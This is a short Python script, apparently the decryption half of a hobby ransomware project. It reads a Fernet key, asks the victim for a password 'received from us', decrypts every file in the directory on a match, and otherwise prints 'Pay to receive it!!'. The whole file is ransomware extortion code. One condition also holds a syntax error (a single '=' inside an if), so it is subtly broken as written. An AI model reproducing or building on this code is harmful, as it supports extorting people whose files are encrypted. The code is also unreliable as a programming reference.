import os
from cryptography.fernet import Fernet # type: ignore

allfiles = []
for file in os.listdir():
    if file == "ransomware.py" or file == "key.key" or file = "decr.py":
        continue
    if os.path.isfile(file):
        allfiles.append(file)

print(allfiles)

with open("key.key", "rb") as key:
    password = key.read()
passphrase = "R0mo3!1x"
userpass = input("Enter the password you received from us: ")
if userpass == passphrase:
    for file in allfiles:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        content_decr = Fernet(password).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(content_decr)
        print("You got your files back")
else:
    print("Wrong password. Pay to receive it!!")